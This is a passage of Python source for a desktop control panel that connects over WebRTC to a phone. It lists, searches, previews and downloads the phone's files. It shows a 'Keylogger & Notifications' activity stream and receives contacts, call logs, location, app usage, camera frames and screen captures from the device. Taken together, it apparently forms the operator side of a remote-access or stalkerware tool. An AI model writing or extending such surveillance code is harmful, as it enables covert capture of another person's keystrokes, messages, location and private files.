        self.view_toggle_btn = ctk.CTkButton(toolbar_buttons, text="🔲 Grid" if getattr(self, "view_mode", "list") == "grid" else "📄 List", width=70, height=28,
                                             fg_color="transparent", hover_color=self.C_HOVER, text_color=self.C_TEXT,
                                             command=self.toggle_view_mode)
        self.view_toggle_btn.pack(side="right", padx=5)

        self.files_scroll_frame = ctk.CTkScrollableFrame(self.main_frame, fg_color=self.C_BG)
        self.files_scroll_frame.pack(fill="both", expand=True, padx=0, pady=0)
        
        def on_bg_right_click(event):
            # Only trigger background menu if not clicking on a file item
            self.file_ops.show_bg_context_menu(event)
            
        try:
            self.files_scroll_frame._parent_canvas.bind("<Button-3>", on_bg_right_click)
            self.files_scroll_frame._parent_frame.bind("<Button-3>", on_bg_right_click)
        except:
            pass

        # Details panel (hidden by default, shows on right side)
        self.detail_panel = None
        # Dict to map file_path -> thumbnail CTkLabel widget for inline updates
        self.inline_thumb_refs = {}
        self._inline_thumb_images = {}  # prevent GC
        
        self.request_file_list()

    def toggle_view_mode(self):
        self.view_mode = "grid" if getattr(self, "view_mode", "list") == "list" else "list"
        self.view_toggle_btn.configure(text="🔲 Grid" if self.view_mode == "grid" else "📄 List")
        self._update_file_list_keep_selection()

    def _update_breadcrumbs(self, path):
        """Build clickable segments for the current path in the toolbar."""
        if not hasattr(self, 'breadcrumb_container') or not self.breadcrumb_container.winfo_exists():
            return
            
        for child in self.breadcrumb_container.winfo_children():
            child.destroy()
            
        segments = [s for s in path.split('/') if s]
        
        # Root button
        root_btn = ctk.CTkButton(self.breadcrumb_container, text="📱 Storage", width=10, height=24,
                               fg_color="transparent", hover_color=self.C_HOVER, 
                               text_color=self.C_ACCENT, font=("Segoe UI Bold", 11),
                               command=lambda: self.request_file_list("/"))
        root_btn.pack(side="left")
        
        current_path = ""
        for i, seg in enumerate(segments):
            ctk.CTkLabel(self.breadcrumb_container, text=">", font=("Segoe UI", 10), text_color=self.C_MUTED).pack(side="left", padx=2)
            current_path += "/" + seg
            # Use default arg in lambda to capture current state of current_path
            btn = ctk.CTkButton(self.breadcrumb_container, text=seg, width=10, height=24,
                              fg_color="transparent", hover_color=self.C_HOVER,
                              text_color=self.C_TEXT if i < len(segments)-1 else self.C_ACCENT,
                              font=("Segoe UI", 11) if i < len(segments)-1 else ("Segoe UI Bold", 11),
                              command=lambda p=current_path: self.request_file_list(p))
            btn.pack(side="left")

    def go_up_directory(self):
        if hasattr(self, 'current_browsing_path'):
            import posixpath
            parent = posixpath.dirname(self.current_browsing_path)
            if parent and parent != self.current_browsing_path:
                self.request_file_list(parent)
                
    def request_file_list(self, path=None):
        self.webrtc.send_command({"type": "list_files", "path": path})

    def request_file_info(self, path):
        self.webrtc.send_command({"type": "file_info", "path": path})

    def request_file_download(self, path):
            self.webrtc.data_channel.send(f"download_file:{path}")

    def open_file_preview(self, filepath):
        import subprocess
        abs_path = os.path.abspath(filepath)
        try:
            subprocess.Popen(f'explorer /select,"{abs_path}"')
        except Exception as e:
            print(f"Error opening explorer: {e}")

    def _format_size(self, size_bytes):
        if size_bytes < 1024:
            return f"{size_bytes} B"
        elif size_bytes < 1024 * 1024:
            return f"{size_bytes / 1024:.1f} KB"
        elif size_bytes < 1024 * 1024 * 1024:
            return f"{size_bytes / (1024 * 1024):.1f} MB"
        else:
            return f"{size_bytes / (1024 * 1024 * 1024):.2f} GB"

    def _show_file_details(self, data):
        """Show file details in right panel"""
        self.right_panel.grid() # Reveal the right panel
        
        # Clear right panel
        for child in self.right_panel.winfo_children():
            child.destroy()
            
        header = ctk.CTkFrame(self.right_panel, fg_color=self.C_ALT, corner_radius=0, border_color=self.C_HOVER, border_width=1)
        header.pack(fill="x", padx=0, pady=0)
        
        ft = data.get('fileType', 'unknown')
        icons = {'image': '🖼️', 'video': '🎬', 'audio': '🎵', 'pdf': '📕', 'archive': '📦',
                 'text': '📝', 'apk': '📱', 'document': '📄', 'unknown': '📎'}
        icon = icons.get(ft, '📎')
        
        ctk.CTkLabel(header, text=f"{icon}  {data['name']}", font=self.FONT_HEADER,
                     text_color=self.C_TEXT).pack(padx=20, pady=20, anchor="w")

        props_frame = ctk.CTkFrame(self.right_panel, fg_color="transparent")
        props_frame.pack(fill="x", padx=20, pady=10)

        props = [
            ("TYPE", f"{ft.upper()} (.{data.get('extension', '?')})"),
            ("SIZE", self._format_size(data.get('size', 0))),
            ("MODIFIED", data.get('modified', 'Unknown')[:19].replace('T', '  ')),
            ("PATH", data.get('path', '')),
        ]

        for label, value in props:
            row = ctk.CTkFrame(props_frame, fg_color="transparent")
            row.pack(fill="x", pady=5)
            ctk.CTkLabel(row, text=f"{label}", width=80, anchor="w",
                         font=("Segoe UI", 11, "bold"), text_color=self.C_MUTED).pack(side="left")
            ctk.CTkLabel(row, text=value, anchor="w", wraplength=200,
                         font=("Segoe UI", 12), text_color=self.C_TEXT).pack(side="left", fill="x")

        ctk.CTkFrame(self.right_panel, fg_color=self.C_HOVER, height=1).pack(fill="x", padx=20, pady=10)

        self.thumb_frame = ctk.CTkFrame(self.right_panel, fg_color=self.C_BG, height=200, corner_radius=8)
        self.thumb_frame.pack(fill="both", expand=True, padx=20, pady=(5, 10))
        self.thumb_frame.pack_propagate(False)

        ext = data.get('extension', str(data['name']).rsplit('.', 1)[-1] if '.' in data['name'] else '').lower()
        if ft == 'image':
            ctk.CTkLabel(self.thumb_frame, text="⏳ Loading preview...",
                         text_color=self.C_MUTED, font=self.FONT_MAIN).pack(expand=True)
            self.webrtc.data_channel.send(f"file_thumbnail:{data['path']}")
        elif ft == 'text' or ext in ['py', 'js', 'json', 'log', 'csv', 'yaml', 'xml', 'md', 'dart', 'html', 'css', 'txt']:
            ctk.CTkLabel(self.thumb_frame, text="⏳ Loading text preview...",
                         text_color=self.C_MUTED, font=self.FONT_MAIN).pack(expand=True)
            self.webrtc.data_channel.send(f"file_text_preview:{data['path']}")
        elif ft == 'pdf' or ext == 'pdf':
            ctk.CTkLabel(self.thumb_frame, text=f"📕 PDF Document\n\nPreview unavailable natively.\nClick Download to read.",
                         text_color=self.C_MUTED, font=self.FONT_TITLE).pack(expand=True)
        else:
            ctk.CTkLabel(self.thumb_frame, text=f"{icon}\n\nPreview unavailable",
                         text_color=self.C_MUTED, font=self.FONT_TITLE).pack(expand=True)

        btn_frame = ctk.CTkFrame(self.right_panel, fg_color="transparent")
        btn_frame.pack(fill="x", padx=20, pady=20)
        
        ctk.CTkButton(btn_frame, text="📥 Download", fg_color=self.C_ACCENT, hover_color="#2b67cc",
                      command=lambda: self.request_file_download(data)).pack(side="left", expand=True, fill="x", padx=(0, 5))
        ctk.CTkButton(btn_frame, text="✕ Close", fg_color="transparent", border_color=self.C_HOVER, border_width=1, hover_color=self.C_HOVER, width=80,
                      command=self.right_panel.grid_remove).pack(side="right")

    def _on_file_start(self, filename, total_bytes):
        """Called by webrtc_handler when file starts downloading."""
        self.after(0, lambda: (
            self.download_ui.update_progress(filename, 0, total_bytes),
            self.download_ui.show()
        ))

    def _on_download_progress(self, received_bytes, total_bytes):
        """Called by webrtc_handler during download (from asyncio thread)."""
        if self.webrtc.current_download:
            name = self.webrtc.current_download['name']
            self.after(0, lambda: self.download_ui.update_progress(name, received_bytes, total_bytes))

    def _on_file_saved(self, path):
        """Called by webrtc_handler when file completes."""
        self.after(0, lambda: self.download_ui.filename_label.configure(text=f"✅ Download Complete!"))
        # Hide after 3 seconds
        self.after(3000, self.download_ui.hide)

    def request_file_download(self, file_data):
        self.webrtc.data_channel.send(f"download_file:{file_data['path']}")

    def _show_thumbnail(self, raw_bytes):
        """Display thumbnail PNG in the right panel"""
        try:
            if not getattr(self, 'thumb_frame', None) or not self.thumb_frame.winfo_exists():
                return
            for child in self.thumb_frame.winfo_children():
                child.destroy()
            
            img = Image.open(io.BytesIO(raw_bytes))
            img.thumbnail((260, 180))
            ctk_img = ctk.CTkImage(light_image=img, dark_image=img, size=img.size)
            
            lbl = ctk.CTkLabel(self.thumb_frame, text="", image=ctk_img)
            lbl._ctk_img = ctk_img  # prevent GC
            lbl.pack(expand=True)
        except Exception as e:
            print(f"Thumbnail display error: {e}")
            ctk.CTkLabel(self.thumb_frame, text="Failed to load preview",
                         text_color="#aa3333").pack(expand=True)

    def _show_text_preview(self, data):
        """Display text preview in the right panel thumb_frame"""
        try:
            if not getattr(self, 'thumb_frame', None) or not self.thumb_frame.winfo_exists():
                return
            for child in self.thumb_frame.winfo_children():
                child.destroy()

            if data.get('error'):
                ctk.CTkLabel(self.thumb_frame, text=f"Failed to load preview\n{data['error']}",
                             text_color="#aa3333").pack(expand=True)
                return

            text_content = data.get('data', '')
            if not text_content:
                text_content = "(Empty File)"
            
            textbox = ctk.CTkTextbox(self.thumb_frame, font=("Consolas", 11), fg_color="transparent", text_color=self.C_TEXT)
            textbox.pack(fill="both", expand=True, padx=5, pady=5)
            textbox.insert("1.0", text_content)
            textbox.configure(state="disabled")
        except Exception as e:
            print(f"Text preview display error: {e}")

    def trigger_remote_search(self):
        query = self.file_search_entry.get().strip()
        if query:
            self.webrtc.send_command({"type": "search_files", "pattern": query})
            # Visual feedback
            self.devices_label.configure(text=f"🔍 Searching: {query}...")

    def show_activity_view(self):
        self.current_main_view = "activity"
        for child in self.main_frame.winfo_children():
            child.destroy()
            
        self.activity_button.configure(fg_color=self.C_HOVER)
        
        self.activity_view = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        self.activity_view.pack(fill="both", expand=True, padx=20, pady=20)
        
        ctk.CTkLabel(self.activity_view, text="📝 Live Activity Logs (Keylogger & Notifications)", 
                    font=("Segoe UI Bold", 18), text_color=self.C_ACCENT).pack(pady=(0, 10), anchor="w")
        
        self.log_scroll = ctk.CTkScrollableFrame(self.activity_view, fg_color=self.C_BG, 
                                               label_text="Activity Stream", label_font=("Segoe UI Bold", 12))
        self.log_scroll.pack(fill="both", expand=True)
        
        # Populate with existing logs if any
        for entry in getattr(self, "_cached_logs", []):
            self._add_log_entry_to_ui(entry)

    def _add_log_entry_to_ui(self, entry):
        if not hasattr(self, "log_scroll") or not self.log_scroll.winfo_exists():
            return
            
        color = "#FF9800" if entry['log_type'] == "KEYLOG" else "#2196F3"
        icon = "⌨️" if entry['log_type'] == "KEYLOG" else "🔔"
        
        frame = ctk.CTkFrame(self.log_scroll, fg_color=self.C_ALT, corner_radius=4)
        frame.pack(fill="x", pady=2)
        
        timestamp = datetime.fromtimestamp(entry['timestamp']/1000).strftime("%H:%M:%S")
        ctk.CTkLabel(frame, text=f"[{timestamp}] {icon} {entry['package']}", 
                    text_color=color, font=("Segoe UI Bold", 11)).pack(side="left", padx=10)
        
        ctk.CTkLabel(frame, text=entry['content'], text_color=self.C_TEXT, 
                    font=("Segoe UI", 11), wraplength=500, justify="left").pack(side="left", padx=10, pady=5)

    def handle_data_message(self, message):
        """Routing function for all incoming JSON data from the phone."""
        self._on_data_message(message)

    def _on_data_message(self, message):
        try:
            data = json.loads(message)
            mtype = data.get('type')

            if mtype == "activity_log":
                if not hasattr(self, "_cached_logs"): self._cached_logs = []
                self._cached_logs.append(data)
                # Cap at 500 logs
                if len(self._cached_logs) > 500: self._cached_logs.pop(0)
                self._add_log_entry_to_ui(data)

            elif mtype == "search_results":
                self.devices_label.configure(text="✅ Search Complete")
                # Reuse the file list view with search results
                self._show_file_list(data['files'])

            elif mtype == "file_list":
                dev_id = data.get('id')
                if dev_id:
                    self.active_devices.add(dev_id)
                    self.after(0, self._update_devices_ui)
            elif mtype == 'file_list':
                file_count = len(data.get('files', []))
                print(f"[DEBUG] file_list received: path={data.get('path')}, files={file_count}, error={data.get('error')}")
                self.after(0, lambda: self._update_file_list(data))
            elif mtype == 'file_op_result':
                print(f"[DEBUG] file_op_result: {data.get('message')}")
                self.after(0, lambda: self.file_ops.handle_result(data))
            elif mtype == 'error':
                err = data.get('message', 'Unknown error')
                print(f"[DEBUG] error received: {err}")
                def _safe_update():
                    # Extremely defensive check to prevent crashes on view switch
                    lbl = getattr(self, 'current_path_label', None)
                    if lbl and lbl.winfo_exists():
                        lbl.configure(text=f"⚠ ERROR: {err}")
                    elif hasattr(self, 'status_label') and self.status_label.winfo_exists():
                        self.status_label.configure(text=f"⚠ {err[:20]}...", text_color="#ef4444")
                self.after(0, _safe_update)
            elif mtype == 'text_preview_result':
                self.after(0, lambda: self._show_text_preview(data))
            elif mtype == 'contacts_list':
                self.after(0, lambda: self._update_contacts_list(data))
            elif mtype == 'call_logs_list':
                self.after(0, lambda: self._update_call_logs_list(data))
            elif mtype == 'device_status':
                self.after(0, lambda: self._update_device_status(data))
            elif mtype == 'app_usage_list':
                self.after(0, lambda: self._update_app_usage_list(data))
            elif mtype == 'location_update':
                self.after(0, lambda: self._update_location_ui(data))
            elif mtype == 'files_list':
                # Native service uses 'files_list' instead of 'file_list'
                file_count = len(data.get('files', []))
                print(f"[DEBUG] files_list (native) received: path={data.get('path')}, files={file_count}")
                self.after(0, lambda: self._update_file_list(data))
            elif mtype == 'usage_stats':
                # Native usage stats - convert to app_usage_list format
                stats = data.get('stats', [])
                converted = {'type': 'app_usage_list', 'apps': []}
                for s in (stats if isinstance(stats, list) else []):
                    converted['apps'].append({
                        'name': s.get('package', '').split('.')[-1],
                        'package': s.get('package', ''),
                        'time': s.get('totalTime', 0),
                        'lastUsed': s.get('lastUsed', 0)
                    })
                self.after(0, lambda: self._update_app_usage_list(converted))
            elif mtype == 'heartbeat':
                dev = data.get('device_id', 'unknown_device')
                if dev not in self.active_devices:
                    self.active_devices.add(dev)
                    self.after(0, self._update_devices_ui)
        except Exception as e:
            print(f"Message parse error: {e} | Raw: {str(message)[:100]}")

    def _on_search_change(self, event):
        if not hasattr(self, '_full_files_list'): return
        query = self.search_entry.get().lower()
        if query:
            self._all_files = [f for f in self._full_files_list if query in f.get('name', '').lower()]
        else:
            self._all_files = self._full_files_list.copy()
            
        self._update_file_list_keep_selection()

    def _update_file_list(self, data):
        if not hasattr(self, 'files_scroll_frame'): return
        if getattr(self, 'current_main_view', None) != "files": return
        
        self.current_browsing_path = data['path']
        self._update_breadcrumbs(self.current_browsing_path)
        
        for child in self.files_scroll_frame.winfo_children():
            child.destroy()

        # Clear old thumbnail references
        self.inline_thumb_refs = {}
        self._inline_thumb_images = {}

        # Sort: Folders first, then alphabetically
        raw_files = data.get('files', [])
        raw_files.sort(key=lambda x: (not x.get('isDir', False), x.get('name', 'unknown').lower()))
        self._full_files_list = raw_files
        
        # Apply current search filter if any
        if hasattr(self, 'search_entry'):
            query = self.search_entry.get().lower()
            if query:
                self._all_files = [f for f in self._full_files_list if query in f.get('name', '').lower()]
            else:
                self._all_files = self._full_files_list.copy()
        else:
            self._all_files = self._full_files_list.copy()

        self._files_rendered = 0
        self._loading_more = False
        self._PAGE_SIZE = 50

        # Show error or empty state
        if data.get('error'):
            ctk.CTkLabel(self.files_scroll_frame, text=f"⚠ {data['error']}", 
                         font=self.FONT_MAIN, text_color="#ef4444").pack(pady=40)
            return
        if not self._all_files:
            text = "🔍 No files match your search" if hasattr(self, 'search_entry') and self.search_entry.get() else "📂 This folder is empty"
            ctk.CTkLabel(self.files_scroll_frame, text=text, 
                         font=self.FONT_MAIN, text_color=self.C_MUTED).pack(pady=40)
            return

        # Render first batch
        self._render_file_batch()
        self._bind_scroll_detection()

    def _update_file_list_keep_selection(self):
        """Re-render files while preserving file_ops selection state."""
        if hasattr(self, '_all_files'):
            for child in self.files_scroll_frame.winfo_children():
                child.destroy()
            self.inline_thumb_refs = {}
            self._inline_thumb_images = {}
            self._files_rendered = 0
            self._loading_more = False
            
            if not self._all_files:
                text = "🔍 No files match your search" if hasattr(self, 'search_entry') and self.search_entry.get() else "📂 This folder is empty"
                ctk.CTkLabel(self.files_scroll_frame, text=text, font=self.FONT_MAIN, text_color=self.C_MUTED).pack(pady=40)
                return
                
            self._render_file_batch()

    def _bind_scroll_detection(self):
        """Bind scroll detection for infinite scroll."""
        try:
            canvas = self.files_scroll_frame._parent_canvas
            canvas.bind("<Configure>", lambda e: self._check_scroll_position())
            canvas.bind("<MouseWheel>", lambda e: self.after(100, self._check_scroll_position))
            canvas.configure(yscrollcommand=lambda *args: self._on_scroll_move(*args))
        except Exception as e:
            print(f"Scroll bind error: {e}")

    def _on_scroll_move(self, first, last):
        """Called when scroll position changes"""
        try:
            # Update the scrollbar
            canvas = self.files_scroll_frame._parent_canvas
            scrollbar = self.files_scroll_frame._scrollbar
            scrollbar.set(first, last)
        except:
            pass
        # Check if near bottom
        try:
            if float(last) > 0.85:
                self._check_scroll_position()
        except:
            pass

    def _check_scroll_position(self):
        """Check if scrolled near bottom, load more files"""
        if self._loading_more:
            return
        if self._files_rendered >= len(self._all_files):
            return
        
        try:
            canvas = self.files_scroll_frame._parent_canvas
            # Get scroll position
            yview = canvas.yview()
            if yview[1] > 0.85:  # Near bottom
                self._loading_more = True
                self.after(50, self._render_file_batch)
        except:
            pass

    def _bind_row_events(self, row):
        """Recursively bind click, double-click, and hover to ALL widgets in a row."""
        fp = row._file_path
        fd = row._file_data
        bg = row._bg_color
        hf = row._hover_frame

        def on_click(e):
            self.file_ops.on_click(e, fp, fd, row)

        def on_dbl(e):
            self.file_ops.on_double_click(e, fp, fd)

        def on_enter(e):
            # Only hover-highlight if not already selected
            if not self.file_ops.is_selected(fp):
                row.configure(fg_color=self.C_HOVER)

        def on_leave(e):
            if not self.file_ops.is_selected(fp):
                row.configure(fg_color=bg)

        def bind_recursive(widget):
            try:
                is_btn = isinstance(widget, ctk.CTkButton)
                # Skip click bindings on buttons (e.g. "View") so they keep their own action
                if not is_btn:
                    widget.bind("<Button-1>", lambda e: on_dbl(e))  # Left click to open/navigate
                    widget.bind("<Button-3>", lambda e: on_click(e)) # Right click to select/action menu
                widget.bind("<Enter>", lambda e: on_enter(e))
                widget.bind("<Leave>", lambda e: on_leave(e))
            except:
                pass
            for child in widget.winfo_children():
                bind_recursive(child)

        bind_recursive(row)

    def _render_file_batch(self):
        """Render next batch of files into the scroll frame"""
        try:
            start = self._files_rendered
            end = min(start + self._PAGE_SIZE, len(self._all_files))
            
            batch_image_paths = []
            
            print(f"[DEBUG] _render_file_batch START. start={start}, end={end}, len(_all_files)={len(self._all_files)}, view_mode={getattr(self, 'view_mode', 'list')}")
            print(f"[DEBUG] Files to render: {[self._all_files[i].get('name','?') for i in range(start, end)]}")
            for i in range(start, end):
                f = self._all_files[i]
                is_dir = f.get('isDir', False)
                name = f.get('name', 'unknown')
                ext = name.rsplit('.', 1)[-1].lower() if '.' in name else ''
                is_image = ext in ('jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp')
                mod = f.get('modified', 'Unknown')
                if isinstance(mod, (int, float)):
                    import datetime
                    mod_str = datetime.datetime.fromtimestamp(mod/1000.0).strftime('%Y-%m-%d %H:%M')
                else:
                    mod_str = mod[:16].replace('T', ' ') if mod and mod != 'Unknown' else 'Unknown'
                
                view_mode = getattr(self, "view_mode", "list")
                
                if view_mode == "list":
                    # Compact List View with alternating backgrounds
                    bg_color = self.C_BG if i % 2 == 0 else self.C_ALT
                    row = ctk.CTkFrame(self.files_scroll_frame, fg_color=bg_color, height=50, corner_radius=0)
                    row.pack(fill="x", pady=0)
                    row.pack_propagate(False)
                    
                    hover_frame = ctk.CTkFrame(row, fg_color="transparent", corner_radius=0)
                    hover_frame.pack(fill="both", expand=True)

                    # Data references
                    file_path = f.get('path', '')
                    row._file_path = file_path
                    row._file_data = f
                    row._bg_color = bg_color
                    row._hover_frame = hover_frame

                    # Icon selection
                    if is_dir:
                        icon_str = "📁"
                        icon_color = self.C_ACCENT
                    else:
                        file_icons = {'mp4': '🎬', 'mkv': '🎬', 'avi': '🎬', 'mov': '🎬', 'mp3': '🎵', 'wav': '🎵', 'pdf': '📕', 'doc': '📘', 'docx': '📘', 'txt': '📝', 'zip': '📦', 'rar': '📦', 'apk': '📱', 'py': '🐍', 'js': '⚡'}
                        icon_str = file_icons.get(ext, '📄')
                        icon_color = self.C_TEXT

                    icon_lbl = ctk.CTkLabel(hover_frame, text=icon_str, width=40, font=("Segoe UI", 24), text_color=icon_color)
                    icon_lbl.pack(side="left", padx=(10, 5))
                    
                    if not is_dir and is_image:
                        self.inline_thumb_refs[file_path] = icon_lbl
                        batch_image_paths.append(file_path)

                    # Info Button (Compact)
                    info_btn = ctk.CTkButton(hover_frame, text="Info", width=50, height=24, fg_color="transparent", border_color=self.C_HOVER, border_width=1, hover_color=self.C_HOVER, text_color=self.C_TEXT, font=("Segoe UI", 11), command=lambda p=f['path']: self.request_file_info(p))
                    info_btn.pack(side="right", padx=(5, 12))
                    
                    # File Stats
                    date_lbl = ctk.CTkLabel(hover_frame, text=mod_str, anchor="e", font=self.FONT_SMALL, text_color=self.C_MUTED)
                    date_lbl.pack(side="right", padx=(5, 5))
                    
                    text_frame = ctk.CTkFrame(hover_frame, fg_color="transparent")
                    text_frame.pack(side="left", fill="both", expand=True, pady=(4, 0))
                    
                    name_lbl = ctk.CTkLabel(text_frame, text=name, anchor="w", font=self.FONT_MAIN, text_color=self.C_TEXT)
                    name_lbl.pack(side="top", fill="x", padx=(6, 0))
                    
                    sub_info = f.get('size_str', self._format_size(f.get('size', 0))) if not is_dir else f"{f.get('fileCount', 0)} files"
                    sub_lbl = ctk.CTkLabel(text_frame, text=sub_info, anchor="w", font=("Segoe UI", 10), text_color=self.C_MUTED)
                    sub_lbl.pack(side="top", fill="x", padx=(6, 0))
                else:
                    # GRID MODE - Modern Premium Card Design
                    ww = self.files_scroll_frame.winfo_width()
                    # More columns, less width per item for higher density without "gaps"
                    item_w = 110
                    cols = max(1, ww // (item_w + 10)) if ww > 50 else 5
                    grid_r = i // cols
                    grid_c = i % cols
                    
                    row = ctk.CTkFrame(self.files_scroll_frame, fg_color=self.C_PANEL, width=item_w, height=125, corner_radius=10, border_width=1, border_color=self.C_ALT)
                    row.grid(row=grid_r, column=grid_c, padx=6, pady=6)
                    row.grid_propagate(False)
                    row.pack_propagate(False)
                    
                    hover_frame = ctk.CTkFrame(row, fg_color="transparent", corner_radius=10)
                    hover_frame.pack(fill="both", expand=True)

                    file_path = f.get('path', '')
                    row._file_path = file_path
                    row._file_data = f
                    row._bg_color = self.C_PANEL
                    row._hover_frame = hover_frame

                    inner_frame = ctk.CTkFrame(hover_frame, fg_color="transparent")
                    inner_frame.pack(fill="both", expand=True, padx=4, pady=4)
                    
                    if is_dir:
                        icon_str = "📁"
                        icon_color = self.C_ACCENT
                    elif is_image:
                        icon_str = "🖼️"
                        icon_color = self.C_TEXT
                    else:
                        file_icons = {'mp4': '🎬', 'mkv': '🎬', 'mp3': '🎵', 'pdf': '📕', 'doc': '📘', 'txt': '📝', 'zip': '📦', 'apk': '📱', 'py': '🐍', 'js': '⚡'}
                        icon_str = file_icons.get(ext, '📄')
                        icon_color = self.C_TEXT

                    icon_lbl = ctk.CTkLabel(inner_frame, text=icon_str, font=("Segoe UI", 40), text_color=icon_color)
                    icon_lbl.pack(pady=(12, 4))
                    
                    if not is_dir and is_image:
                        self.inline_thumb_refs[file_path] = icon_lbl
                        batch_image_paths.append(file_path)
                        
                    disp_name = name if len(name) < 14 else name[:11] + "..."
                    ctk.CTkLabel(inner_frame, text=disp_name, font=("Segoe UI Bold", 11), text_color=self.C_TEXT).pack(pady=(2,0))
                    
                    sub_info = self._format_size(f.get('size', 0)) if not is_dir else f"{f.get('fileCount', 0)} files"
                    ctk.CTkLabel(inner_frame, text=sub_info, font=("Segoe UI", 9), text_color=self.C_MUTED).pack()

                # Bind click/double-click/hover to ALL widgets in this row
                self._bind_row_events(row)

            self._files_rendered = end
            self._loading_more = False

            actual_children = len(self.files_scroll_frame.winfo_children())
            print(f"[DEBUG] Rendered batch from {start} to {end}. Total active rows in scroll frame: {actual_children}")

            # Force the scrollable frame to recalculate its scroll region
            try:
                self.files_scroll_frame.update_idletasks()
                canvas = self.files_scroll_frame._parent_canvas
                canvas.configure(scrollregion=canvas.bbox("all"))
            except Exception as e:
                print(f"[DEBUG] scroll region update error: {e}")

            # Request batch thumbnails only if this batch has images
            if batch_image_paths:
                self._request_batch_thumbnails(self.current_browsing_path)
        except Exception as e:
            print(f"[ERROR] _render_file_batch crashed: {e}")
            import traceback
            traceback.print_exc()


    def _request_batch_thumbnails(self, path):
        """Ask device to send inline thumbnails for all images in the given path"""
        if hasattr(self.webrtc, 'data_channel') and self.webrtc.data_channel.readyState == "open":
            self.webrtc.send_command({"type": "batch_thumbnails", "path": path})

    def _inline_set_thumbnail(self, file_path, raw_bytes):
        """Update the inline thumbnail label for a specific file in the file list"""
        try:
            lbl = self.inline_thumb_refs.get(file_path)
            if not lbl or not lbl.winfo_exists():
                return
            
            img = Image.open(io.BytesIO(raw_bytes))
            img.thumbnail((36, 36))
            ctk_img = ctk.CTkImage(light_image=img, dark_image=img, size=(36, 36))
            # Store reference to prevent garbage collection
            self._inline_thumb_images[file_path] = ctk_img
            lbl.configure(image=ctk_img, text="")
        except Exception as e:
            print(f"Inline thumbnail error for {file_path}: {e}")

    def _update_camera_frame(self, img):
        """Standard handler for WebRTC frames (PIL images)"""
        try:
            # Route to correct display based on active mode
            if getattr(self, 'screen_active', False) and hasattr(self, 'screen_display') and self.screen_display.winfo_exists():
                # Handle screen share display (Maintain Aspect Ratio)
                display_w = self.screen_container.winfo_width()
                display_h = self.screen_container.winfo_height()
                if display_w > 100:
                    img_w, img_h = img.size
                    ratio = min(display_w/img_w, display_h/img_h)
                    new_size = (int(img_w * ratio), int(img_h * ratio))
                    img = img.resize(new_size, Image.Resampling.LANCZOS)
                
                photo = ImageTk.PhotoImage(img)
                self.screen_display.configure(image=photo, text="")
                self.screen_display._image_ref = photo # Prevent GC
            
            elif hasattr(self, 'camera_display') and self.camera_display.winfo_exists():
                # Apply custom rotation and mirror
                if getattr(self, 'camera_rotation', 0) != 0:
                    img = img.rotate(-self.camera_rotation, expand=True) # Counter-clockwise to match UI feel
                
                if getattr(self, 'camera_mirror', False):
                    img = img.transpose(Image.FLIP_LEFT_RIGHT)

                # Fit image to panel while preserving aspect ratio (handles portrait/landscape)
                img_w, img_h = img.size
                panel_w = self.right_panel.winfo_width() - 20  # Account for padding
                panel_h = self.right_panel.winfo_height() - 80  # Account for header + padding
                
                if panel_w > 50 and panel_h > 50:
                    ratio = min(panel_w / img_w, panel_h / img_h)
                    target_w = int(img_w * ratio)
                    target_h = int(img_h * ratio)
                else:
                    target_w = img_w
                    target_h = img_h
                
                img = img.resize((target_w, target_h), Image.Resampling.NEAREST)
                ctk_img = ctk.CTkImage(light_image=img, dark_image=img, size=(target_w, target_h))
                self.after(0, lambda: self._apply_camera_frame(ctk_img))
        except Exception as e:
            print(f"Frame Update Error: {e}")

    def _apply_camera_frame(self, ctk_img):
        """Helper for thread-safe UI update"""
        try:
            if hasattr(self, 'camera_display') and self.camera_display.winfo_exists():
                self.camera_display.configure(image=ctk_img, text="")
                self.camera_display._img_ref = ctk_img # Keep ref to avoid GC
        except Exception as e:
            pass

    # --- CONTACTS VIEW ---
    def show_contacts_view(self):
        self.current_main_view = "contacts"
        for child in self.main_frame.winfo_children():
            child.destroy()
            
        top_frame = ctk.CTkFrame(self.main_frame, fg_color=self.C_PANEL, height=50, corner_radius=0)
        top_frame.pack(fill="x", padx=0, pady=0)
        top_frame.pack_propagate(False)
        
        ctk.CTkLabel(top_frame, text=" 📇 CONTACTS REGISTRY", font=self.FONT_HEADER, text_color=self.C_ACCENT).pack(side="left", padx=20)
        
        self.contact_search = ctk.CTkEntry(top_frame, placeholder_text="Search contacts...", width=250, font=self.FONT_MAIN, fg_color=self.C_BG, border_color=self.C_HOVER)
        self.contact_search.pack(side="right", padx=10, pady=10)
        self.contact_search.bind("<KeyRelease>", self._on_contacts_search_change)
        
        self.contacts_count_label = ctk.CTkLabel(top_frame, text="Count: 0", font=self.FONT_SMALL, text_color=self.C_MUTED)
        self.contacts_count_label.pack(side="right", padx=15)

        self.contacts_scroll_frame = ctk.CTkScrollableFrame(self.main_frame, fg_color="transparent", corner_radius=0)
        self.contacts_scroll_frame.pack(fill="both", expand=True, padx=20, pady=20)
        
        ctk.CTkLabel(self.contacts_scroll_frame, text="⏳ Requesting Contact List...", font=self.FONT_MAIN, text_color=self.C_MUTED).pack(pady=40)
        self.webrtc.request_contacts()

    def _update_contacts_list(self, data):
        if getattr(self, 'current_main_view', None) != "contacts": return
        for child in self.contacts_scroll_frame.winfo_children():
            child.destroy()
            
        contacts = data.get('contacts', [])
        # Sort A-Z by name
        contacts.sort(key=lambda x: str(x.get('name', '')).lower())
        
        self._full_contacts_list = contacts
        self._filtered_contacts = contacts.copy()
        self._contacts_rendered = 0
        self._PAGE_SIZE = 40
        
        if hasattr(self, 'contacts_count_label'):
            self.contacts_count_label.configure(text=f"TOTAL CONTACTS: {len(contacts)}")
        
        if not contacts:
            ctk.CTkLabel(self.contacts_scroll_frame, text="No contacts found on device.", font=self.FONT_MAIN, text_color=self.C_MUTED).pack(pady=40)
            return

        self._render_contacts_batch()
        self._bind_scroll(self.contacts_scroll_frame, self._render_contacts_batch)

    def _render_contacts_batch(self):
        if not hasattr(self, '_filtered_contacts'): return
        if self._contacts_rendered >= len(self._filtered_contacts): return
        
        start = self._contacts_rendered
        end = min(start + self._PAGE_SIZE, len(self._filtered_contacts))
        
        for i in range(start, end):
            c = self._filtered_contacts[i]
            frame = ctk.CTkFrame(self.contacts_scroll_frame, fg_color=self.C_PANEL if i % 2 == 0 else self.C_ALT, corner_radius=4)
            frame.pack(fill="x", pady=2, padx=10)
            
            name = c.get('name', 'Unnamed')
            phones = ", ".join(c.get('phones', []))
            
            # Icon
